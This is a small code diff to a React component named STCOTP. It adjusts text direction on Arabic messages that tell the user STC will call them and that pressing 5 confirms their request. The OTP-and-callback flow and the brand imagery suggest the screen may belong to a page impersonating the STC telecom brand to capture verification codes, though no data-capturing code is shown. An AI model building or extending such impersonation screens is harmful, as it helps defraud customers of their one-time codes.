@@ -110,11 +110,16 @@ const STCOTP = () => {
           alt="STC"
         />
         <div className="  w-full flex flex-col jus items-center gap-y-4">
-          <p className="text-xl font-bold"> STC سوف يتم الاتصال بك من </p>
+          <p className="text-xl font-bold " dir="ltr">
+            {" "}
+            STC سوف يتم الاتصال بك من{" "}
+          </p>
           <p className="font-bold text-gray-500" style={{ fontSize: "12px" }}>
             لتأكيد طلبك الرجاء الضغط على رقم 5
           </p>
-          <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
+          <span className="text-purple-700 font-bold" dir="ltr">
+            ! يرجي الإنتظار
+          </span>
         </div>
         <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
           <span className="text-purple-700 font-bold ">إعادة الاتصال بعد </span>
